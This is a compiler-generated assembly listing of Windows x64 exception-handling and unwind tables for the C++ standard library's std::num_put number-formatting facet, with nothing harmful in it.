;	COMDAT xdata
xdata	SEGMENT
$unwind$??_G?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@MEAAPEAXI@Z DD 010d01H
	DD	0420dH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Rep@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@AEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@D_K@Z DD 031a01H
	DD	07016421aH
	DD	06015H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Put@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@AEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@PEBD_K@Z DD 031a01H
	DD	07016421aH
	DD	06015H
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DW	027H
	DW	068aH
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?dtor$3@?0??_Iput@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@AEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@DPEAD_K@Z@4HA DD 020601H
	DD	050023206H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?dtor$2@?0??_Iput@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@AEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@DPEAD_K@Z@4HA DD 020601H
	DD	050023206H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?dtor$1@?0??_Iput@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@AEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@DPEAD_K@Z@4HA DD 020601H
	DD	050023206H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?dtor$0@?0??_Iput@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@AEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@DPEAD_K@Z@4HA DD 020601H
	DD	050023206H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$ip2state$?_Iput@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@AEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@DPEAD_K@Z DB 012H
	DB	00H
	DB	00H
	DB	0a5H, 04H
	DB	02H
	DB	01eH
	DB	00H
	DB	'L'
	DB	04H
	DB	0d4H
	DB	06H
	DB	'$'
	DB	04H
	DB	'@'
	DB	08H
	DB	0b5H, 011H
	DB	04H
	DB	01cH
	DB	00H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$stateUnwindMap$?_Iput@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@AEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@DPEAD_K@Z DB 08H
	DB	0eH
	DD	imagerel ?dtor$0@?0??_Iput@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@AEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@DPEAD_K@Z@4HA
	DB	036H
	DD	imagerel ?dtor$1@?0??_Iput@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@AEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@DPEAD_K@Z@4HA
	DB	02eH
	DD	imagerel ?dtor$2@?0??_Iput@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@AEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@DPEAD_K@Z@4HA
	DB	056H
	DD	imagerel ?dtor$3@?0??_Iput@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@AEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@DPEAD_K@Z@4HA
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$cppxdata$?_Iput@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@AEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@DPEAD_K@Z DB 028H
	DD	imagerel $stateUnwindMap$?_Iput@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@AEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@DPEAD_K@Z
	DD	imagerel $ip2state$?_Iput@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@AEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@DPEAD_K@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Iput@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@AEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@DPEAD_K@Z DD 042f19H
	DD	03d011dH
	DD	060157016H
	DD	imagerel __GSHandlerCheck_EH4
	DD	imagerel $cppxdata$?_Iput@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@AEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@DPEAD_K@Z
	DD	01d2H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Ifmt@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@AEBAPEADPEADPEBDH@Z DD 011801H
	DD	02218H
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DW	027H
	DW	0785H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?dtor$3@?0??_Fput@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@AEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@DPEBD_K@Z@4HA DD 020601H
	DD	050023206H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?dtor$2@?0??_Fput@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@AEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@DPEBD_K@Z@4HA DD 020601H
	DD	050023206H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?dtor$1@?0??_Fput@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@AEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@DPEBD_K@Z@4HA DD 020601H
	DD	050023206H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?dtor$0@?0??_Fput@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@AEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@DPEBD_K@Z@4HA DD 020601H
	DD	050023206H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$ip2state$?_Fput@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@AEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@DPEBD_K@Z DB 012H
	DB	00H
	DB	00H
	DB	'm', 07H
	DB	02H
	DB	'*'
	DB	00H
	DB	'L'
	DB	04H
	DB	0daH
	DB	06H
	DB	'$'
	DB	04H
	DB	'@'
	DB	08H
	DB	0b5H, 012H
	DB	04H
	DB	01cH
	DB	00H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$stateUnwindMap$?_Fput@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@AEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@DPEBD_K@Z DB 08H
	DB	0eH
	DD	imagerel ?dtor$0@?0??_Fput@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@AEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@DPEBD_K@Z@4HA
	DB	036H
	DD	imagerel ?dtor$1@?0??_Fput@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@AEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@DPEBD_K@Z@4HA
	DB	02eH
	DD	imagerel ?dtor$2@?0??_Fput@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@AEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@DPEBD_K@Z@4HA
	DB	056H
	DD	imagerel ?dtor$3@?0??_Fput@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@AEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@DPEBD_K@Z@4HA
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$cppxdata$?_Fput@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@AEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@DPEBD_K@Z DB 028H
	DD	imagerel $stateUnwindMap$?_Fput@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@AEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@DPEBD_K@Z
	DD	imagerel $ip2state$?_Fput@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@AEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@DPEBD_K@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Fput@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@AEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@DPEBD_K@Z DD 042f19H
	DD	041011dH
	DD	060157016H
	DD	imagerel __GSHandlerCheck_EH4
	DD	imagerel $cppxdata$?_Fput@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@AEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@DPEBD_K@Z
	DD	01f2H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Ffmt@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@AEBAPEADPEADDH@Z DD 011801H
	DD	02218H
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	027H
	DB	0abH
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?do_put@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@MEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@DPEBX@Z DD 042f19H
	DD	015011dH
	DD	060157016H
	DD	imagerel __GSHandlerCheck
	DD	090H
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DW	027H
	DW	0254H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?dtor$0@?0??do_put@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@MEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@DO@Z@4HA DD 020601H
	DD	050023206H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$ip2state$?do_put@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@MEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@DO@Z DB 06H
	DB	00H
	DB	00H
	DB	'z'
	DB	02H
	DB	09H, 08H
	DB	00H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$stateUnwindMap$?do_put@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@MEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@DO@Z DB 02H
	DB	0eH
	DD	imagerel ?dtor$0@?0??do_put@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@MEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@DO@Z@4HA
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$cppxdata$?do_put@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@MEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@DO@Z DB 028H
	DD	imagerel $stateUnwindMap$?do_put@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@MEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@DO@Z
	DD	imagerel $ip2state$?do_put@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@MEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@DO@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?do_put@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@MEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@DO@Z DD 042f19H
	DD	019011dH
	DD	060157016H
	DD	imagerel __GSHandlerCheck_EH4
	DD	imagerel $cppxdata$?do_put@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@MEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@DO@Z
	DD	0baH
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DW	027H
	DW	0254H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?dtor$0@?0??do_put@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@MEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@DN@Z@4HA DD 020601H
	DD	050023206H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$ip2state$?do_put@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@MEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@DN@Z DB 06H
	DB	00H
	DB	00H
	DB	'z'
	DB	02H
	DB	09H, 08H
	DB	00H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$stateUnwindMap$?do_put@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@MEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@DN@Z DB 02H
	DB	0eH
	DD	imagerel ?dtor$0@?0??do_put@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@MEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@DN@Z@4HA
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$cppxdata$?do_put@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@MEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@DN@Z DB 028H
	DD	imagerel $stateUnwindMap$?do_put@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@MEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@DN@Z
	DD	imagerel $ip2state$?do_put@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@MEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@DN@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?do_put@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@MEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@DN@Z DD 042f19H
	DD	019011dH
	DD	060157016H
	DD	imagerel __GSHandlerCheck_EH4
	DD	imagerel $cppxdata$?do_put@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@MEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@DN@Z
	DD	0baH
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	027H
	DB	0d0H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?do_put@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@MEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@D_K@Z DD 042f19H
	DD	017011dH
	DD	060157016H
	DD	imagerel __GSHandlerCheck
	DD	0a0H
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	027H
	DB	0d0H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?do_put@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@MEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@D_J@Z DD 042f19H
	DD	017011dH
	DD	060157016H
	DD	imagerel __GSHandlerCheck
	DD	0a0H
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	027H
	DB	0d0H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?do_put@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@MEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@DK@Z DD 042f19H
	DD	017011dH
	DD	060157016H
	DD	imagerel __GSHandlerCheck
	DD	0a0H
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	027H
	DB	0d0H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?do_put@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@MEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@DJ@Z DD 042f19H
	DD	017011dH
	DD	060157016H
	DD	imagerel __GSHandlerCheck
	DD	0a0H
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DW	027H
	DW	035eH
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?dtor$1@?0??do_put@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@MEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@D_N@Z@4HA DD 020601H
	DD	050023206H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?dtor$0@?0??do_put@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@MEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@D_N@Z@4HA DD 020601H
	DD	050023206H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$ip2state$?do_put@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@MEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@D_N@Z DB 0aH
	DB	00H
	DB	00H
	DB	095H, 03H
	DB	02H
	DB	01eH
	DB	00H
	DB	'6'
	DB	04H
	DB	0e9H, 08H
	DB	00H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$stateUnwindMap$?do_put@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@MEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@D_N@Z DB 04H
	DB	0eH
	DD	imagerel ?dtor$0@?0??do_put@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@MEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@D_N@Z@4HA
	DB	036H
	DD	imagerel ?dtor$1@?0??do_put@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@MEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@D_N@Z@4HA
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$cppxdata$?do_put@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@MEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@D_N@Z DB 028H
	DD	imagerel $stateUnwindMap$?do_put@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@MEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@D_N@Z
	DD	imagerel $ip2state$?do_put@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@MEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@D_N@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?do_put@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@MEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@D_N@Z DD 042f19H
	DD	02d011dH
	DD	060157016H
	DD	imagerel __GSHandlerCheck_EH4
	DD	imagerel $cppxdata$?do_put@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@MEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@D_N@Z
	DD	0152H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?put@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@QEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@DPEBX@Z DD 031a01H
	DD	07016821aH
	DD	06015H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?put@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@QEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@DJ@Z DD 031a01H
	DD	07016821aH
	DD	06015H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?dtor$0@?0???0?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@QEAA@AEBV_Locinfo@1@_K@Z@4HA DD 020601H
	DD	050023206H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$ip2state$??0?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@QEAA@AEBV_Locinfo@1@_K@Z DB 06H
	DB	00H
	DB	00H
	DB	'F'
	DB	02H
	DB	'>'
	DB	00H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$stateUnwindMap$??0?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@QEAA@AEBV_Locinfo@1@_K@Z DB 02H
	DB	0eH
	DD	imagerel ?dtor$0@?0???0?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@QEAA@AEBV_Locinfo@1@_K@Z@4HA
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$cppxdata$??0?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@QEAA@AEBV_Locinfo@1@_K@Z DB 028H
	DD	imagerel $stateUnwindMap$??0?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@QEAA@AEBV_Locinfo@1@_K@Z
	DD	imagerel $ip2state$??0?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@QEAA@AEBV_Locinfo@1@_K@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@QEAA@AEBV_Locinfo@1@_K@Z DD 011311H
	DD	04213H
	DD	imagerel __CxxFrameHandler4
	DD	imagerel $cppxdata$??0?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@QEAA@AEBV_Locinfo@1@_K@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??1?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@MEAA@XZ DD 010901H
	DD	04209H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?dtor$1@?0??_Getcat@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@SA_KPEAPEBVfacet@locale@2@PEBV42@@Z@4HA DD 020601H
	DD	050023206H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?dtor$0@?0??_Getcat@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@SA_KPEAPEBVfacet@locale@2@PEBV42@@Z@4HA DD 020601H
	DD	050023206H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$ip2state$?_Getcat@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@SA_KPEAPEBVfacet@locale@2@PEBV42@@Z DB 0eH
	DB	00H
	DB	00H
	DB	092H
	DB	02H
	DB	'b'
	DB	04H
	DB	'H'
	DB	02H
	DB	012H
	DB	04H
	DB	014H
	DB	06H
	DB	' '
	DB	00H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$stateUnwindMap$?_Getcat@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@SA_KPEAPEBVfacet@locale@2@PEBV42@@Z DB 06H
	DB	0eH
	DD	imagerel ?dtor$0@?0??_Getcat@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@SA_KPEAPEBVfacet@locale@2@PEBV42@@Z@4HA
	DB	02eH
	DD	imagerel ?dtor$1@?0??_Getcat@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@SA_KPEAPEBVfacet@locale@2@PEBV42@@Z@4HA
	DB	05eH
	DD	imagerel ?dtor$1@?0??_Getcat@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@SA_KPEAPEBVfacet@locale@2@PEBV42@@Z@4HA
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$cppxdata$?_Getcat@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@SA_KPEAPEBVfacet@locale@2@PEBV42@@Z DB 028H
	DD	imagerel $stateUnwindMap$?_Getcat@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@SA_KPEAPEBVfacet@locale@2@PEBV42@@Z
	DD	imagerel $ip2state$?_Getcat@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@SA_KPEAPEBVfacet@locale@2@PEBV42@@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Getcat@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@SA_KPEAPEBVfacet@locale@2@PEBV42@@Z DD 021111H
	DD	0190111H
	DD	imagerel __CxxFrameHandler4
	DD	imagerel $cppxdata$?_Getcat@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@SA_KPEAPEBVfacet@locale@2@PEBV42@@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?dtor$1@?0???$use_facet@V?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@@std@@YAAEBV?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@0@AEBVlocale@0@@Z@4HA DD 020601H
	DD	050023206H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?dtor$0@?0???$use_facet@V?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@@std@@YAAEBV?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@0@AEBVlocale@0@@Z@4HA DD 020601H
	DD	050023206H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$ip2state$??$use_facet@V?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@@std@@YAAEBV?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@0@AEBVlocale@0@@Z DB 0aH
	DB	00H
	DB	00H
	DB	','
	DB	02H
	DB	'!', 02H
	DB	04H
	DB	'v'
	DB	02H
	DB	'('
	DB	00H
xdata	ENDS
